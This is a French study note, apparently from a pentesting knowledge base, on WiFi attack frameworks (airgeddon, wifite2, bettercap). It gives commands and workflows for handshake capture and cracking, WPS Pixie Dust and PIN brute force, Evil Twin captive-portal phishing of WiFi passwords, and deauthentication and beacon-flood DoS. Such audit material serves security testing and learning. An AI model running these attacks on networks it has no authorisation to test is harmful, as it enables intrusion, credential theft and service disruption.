---
title: "Frameworks WiFi Tout-en-Un"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Networking > WiFi"
tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, airgeddon, wifite, bettercap, automation]
date: "2026-05-17"
---

# Frameworks WiFi Tout-en-Un

Outils qui orchestrent les briques (airmon, airodump, aireplay, hashcat, hostapd...) derrière un menu unique. Gain de temps énorme en audit, mais comprendre les étapes manuelles ([[03 - Attaques WPA2-PSK]], [[05 - Evil Twin et Phishing]]) reste essentiel.

## airgeddon — menu interactif Bash

Framework de référence en français/anglais. Couvre presque toutes les attaques.

```bash
# Installation
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
cd airgeddon
sudo bash airgeddon.sh

# Premier lancement → vérification des dépendances
# Installe automatiquement ce qui manque (sur apt/pacman/dnf)
```

### Menu principal

```
*** Menu principal ***
 1.  Quitter le script
 2.  Sélectionner une autre interface réseau
 3.  Mettre l'interface en mode monitor
 4.  Mettre l'interface en mode managé
 5.  Menu d'attaques DoS
 6.  Menu d'attaques par handshake/PMKID
 7.  Outils handshake offline
 8.  Outils WPS offline
 9.  Menu d'attaques WPS
 10. Menu d'attaques WEP
 11. Menu Evil Twin
 12. Outils Enterprise
 13. Outils divers
```

### Workflow typique : capture handshake + crack

```
Menu 6 → 4 : Capturer le handshake
   → Sélectionner cible dans la liste scannée
   → Choisir méthode deauth (mdk4 / aireplay / wds)
   → Capture automatique avec validation pyrit/cowpatty/aircrack
   → Handshake sauvegardé dans ~/handshake-MaisonBox.cap

Menu 7 → 2 : Crack avec aircrack-ng (dictionnaire)
   → ou option 3 : hashcat (GPU)
   → ou option 4 : John the Ripper
```

### Workflow Evil Twin avec captive portal

```
Menu 11 → 9 : Evil Twin AP attack with captive portal
   → Sélectionner cible
   → Choisir interface DoS (mdk4 recommandé)
   → Capturer un handshake (sera utilisé pour valider la PSK)
   → Choisir le template du portail :
        - Néerlandais / Anglais / Espagnol / Français / Allemand / ...
        - Style : générique / FAI (Livebox/Bbox/Free/SFR) / fabricant
   → airgeddon lance :
        * hostapd (faux AP)
        * dnsmasq (DHCP + DNS hijack)
        * Apache/Nginx (portail)
        * mdk4 (deauth continu sur le vrai AP)
   → Quand victime saisit la PSK → vérification vs handshake
   → Si OK : "Password found: 'MonMotDePasse123'"
```

### Workflow WPS

```
Menu 9 → 5 : Pixie Dust attack
   → Sélectionner cible (filtrage des APs avec WPS activé)
   → airgeddon lance reaver -K 1
   → Si succès : PSK affichée directement

Menu 9 → 7 : PIN bruteforce
   → reaver avec délai anti-lockout
   → Reprise auto en cas de blocage
```

### Workflow DoS

```
Menu 5 → 2 : Deauth amok mdk4
   → Liste blanche/noire de clients
Menu 5 → 4 : Wids confusion mdk4
Menu 5 → 6 : Beacon flood
```

### Sortie / loot

```
~/handshakes/         # captures .cap et .hccapx
~/evil_twin/          # logs phishing, PSK captées
~/wps/                # sessions reaver
~/captured/           # credentials Enterprise
```

## wifite2 — automation pure

Plus minimaliste qu'airgeddon, **non interactif** : on lance, on attend, on récupère les PSK.

```bash
# Installation
git clone https://github.com/derv82/wifite2
cd wifite2 && sudo python setup.py install

# Lancer (scan + attaque automatique sur tout ce qui est faisable)
sudo wifite

# Cibler uniquement les APs avec WPS
sudo wifite --wps-only

# Cibler uniquement WPA/WPA2
sudo wifite --wpa

# Wordlist personnalisée
sudo wifite --dict /usr/share/wordlists/rockyou.txt

# Filtrer par puissance min
sudo wifite --power 50      # ignore APs < -50 dBm

# Filtrer par ESSID
sudo wifite --essid MaisonBox

# Filtrer par MAC
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# Activer toutes les attaques (par défaut : seulement WPA handshake)
sudo wifite --all
```

### Ordre d'attaque automatique

1. **WPS Pixie Dust** (rapide, si applicable)
2. **WPS PIN bruteforce** (si Pixie échoue)
3. **PMKID** (sans client)
4. **WPA handshake** (avec deauth)
5. **WEP** (si présent)

Tout résultat (PSK trouvée, hashes, captures) est sauvé dans `hs/` et affiché à la fin :

```
[+] Cracked 2 handshakes:
   [+] MaisonBox  (AA:BB:CC:DD:EE:FF)  →  MonMotDePasse123
   [+] HotelXYZ   (11:22:33:44:55:66)  →  hotel2024
```

## bettercap — module wifi

Framework MITM générique avec un module WiFi solide. Idéal pour scripter et combiner.

```bash
# Installation
sudo apt install bettercap
# ou
sudo go install github.com/bettercap/bettercap@latest

# Lancer avec interface en monitor
sudo bettercap -iface wlan0mon
```

### Commandes utiles dans le prompt

```
# Scan WiFi
> wifi.recon on
> wifi.show
> wifi.show.sort clients desc

# Deauth d'un client
> wifi.deauth AA:BB:CC:DD:EE:FF

# Capture handshake (auto-deauth si client présent)
> set wifi.handshakes.file /tmp/hs.pcap
> wifi.recon on
> wifi.assoc AA:BB:CC:DD:EE:FF       # force PMKID si possible

# Channel hopping personnalisé
> set wifi.recon.channel 1,6,11
> wifi.recon on

# Lancer un script
> set wifi.deauth.silent true
```

### Caplet (script bettercap)

```bash
# wifi-handshake.cap
set wifi.handshakes.file /tmp/hs.pcap
wifi.recon on
wifi.assoc *
wifi.deauth ff:ff:ff:ff:ff:ff
```

```bash
sudo bettercap -iface wlan0mon -caplet wifi-handshake.cap
```

### Web UI

```bash
sudo bettercap -iface wlan0mon -caplet http-ui
# → https://127.0.0.1 (admin/admin)
# Interface graphique pour suivi temps réel
```

## Comparaison

| Framework | Interactif | Couverture | Cas d'usage |
|-----------|------------|------------|-------------|
| **airgeddon** | Oui (menu) | Très large (PSK, WPS, Evil Twin, Enterprise, DoS) | Audit complet, apprentissage |
| **wifite2** | Non (auto) | Large mais focus PSK/WPS | Audit rapide en masse |
| **bettercap** | CLI + Web | WiFi + MITM générique | Scripts, combinaisons avec MITM TCP/HTTPS |
| **fluxion** | Oui (menu) | Evil Twin seulement | Évil Twin avec captive portal |
| **wifiphisher** | Non (auto) | Evil Twin + phishing avancé | Phishing scénarisé |

## Conseils pratiques

- En audit : **wifite2** pour énumérer rapidement les APs faibles → puis **airgeddon** pour cibler manuellement
- Toujours vérifier la qualité du handshake avant de lancer un crack long (`hcxpcapngtool` valide mieux qu'aircrack)
- Sur audit Enterprise : **eaphammer** > airgeddon (plus de contrôle sur les méthodes EAP)
- En lab : **bettercap** pour scripter des chaînes complexes (WiFi → ARP spoof → HTTPS strip)

## Voir aussi

- [[03 - Attaques WPA2-PSK]] — étapes manuelles que wifite/airgeddon orchestrent
- [[05 - Evil Twin et Phishing]] — fluxion / wifiphisher détaillés
- [[06 - Attaques WPA2-Enterprise]] — eaphammer pour le mode Enterprise
- [[07 - DoS et MDK4]] — mdk4 utilisé en interne par airgeddon
